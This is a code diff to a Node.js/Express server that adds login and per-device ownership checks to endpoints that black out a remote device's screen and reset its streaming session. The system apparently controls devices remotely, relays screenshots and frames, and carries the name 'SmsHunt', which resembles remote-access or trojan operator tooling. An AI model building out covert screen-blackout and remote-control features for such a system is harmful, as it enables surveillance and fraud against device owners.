@@ -2335,8 +2335,10 @@ app.post('/api/admin/login', (req, res) => {
 // ── Fast dedicated blackout channel ──────────────────────────────────────────
 // Bypasses the WebSocket command queue — writes directly to the device TCP socket.
 // Dashboard calls this via HTTP for minimum latency (no WS roundtrip, no queue wait).
-app.post('/api/device/:deviceId/blackout', (req, res) => {
+app.post('/api/device/:deviceId/blackout', requireUserOrAdmin, async (req, res) => {
     const { deviceId } = req.params;
+    const authorized = await authorizeSmsHuntDevice(req, deviceId);
+    if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
     const { state } = req.body; // true = on, false = off
     const command  = state ? 'screen_blackout_on' : 'screen_blackout_off';
     const tcpConnId = deviceToTcp.get(deviceId);
@@ -4133,9 +4135,11 @@ app.post('/api/commands/flush', (req, res) => {
 //   • Removes the device from the active-streaming set
 //   • Resets the per-device frame-relay throttle timestamp
 //   • Scans Redis and deletes every command:* cache key (screenshots, frame blobs, results)
-app.post('/api/device/:deviceId/reset-session', async (req, res) => {
+app.post('/api/device/:deviceId/reset-session', requireUserOrAdmin, async (req, res) => {
     const { deviceId } = req.params;
     if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+    const authorized = await authorizeSmsHuntDevice(req, deviceId);
+    if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
 
     // 1. Cancel and remove all pending commands for this device
     let cleared = 0;
@@ -4165,8 +4169,8 @@ app.post('/api/device/:deviceId/reset-session', async (req, res) => {
     // 3. Reset frame throttle timestamp
     deviceLastFrameMs.delete(deviceId);
 
-    // 4. Clear all command:* keys from Redis (command result cache, screenshot blobs, etc.)
-    const redisCleared = await R.clearCommandCache();
+    // 4. Clear only this device's cached command results.
+    const redisCleared = await R.clearCommandCache(deviceId);
 
     log('SESSION', `reset-session for ${deviceId}: ${cleared} pending cmd(s) cleared, ${redisCleared} Redis key(s) removed`);
     res.json({ success: true, deviceId, pendingCleared: cleared, redisKeysRemoved: redisCleared });
